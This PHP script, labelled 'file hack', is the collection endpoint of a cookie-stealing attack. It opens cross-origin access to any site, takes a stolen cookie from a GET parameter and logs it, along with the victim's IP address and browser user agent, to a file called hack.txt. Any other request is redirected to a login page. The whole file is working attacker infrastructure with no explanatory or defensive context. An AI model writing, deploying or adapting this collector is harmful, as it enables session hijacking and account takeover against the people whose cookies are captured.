<?php
// file hack
// * allow every one
header("Access-Control-Allow-Origin: *");

if (isset($_GET["cookie"])){

    $myst = $_GET["cookie"];
    $IP = $_SERVER['REMOTE_ADDR'];
    $u_brow = $_SERVER['HTTP_USER_AGENT'];

    date_default_timezone_set("Asia/Bangkok");
    
    $memo_myst = "[".date("Y-m-d H:i:s")."]".$myst."| IP : ".$IP." | AGENT " .$u_brow.PHP_EOL;

    file_put_contents("hack.txt",$memo_myst,FILE_APPEND);

    exit;

} else {
     header("Location: ../user-login-re/login.php");
     exit;
}

?>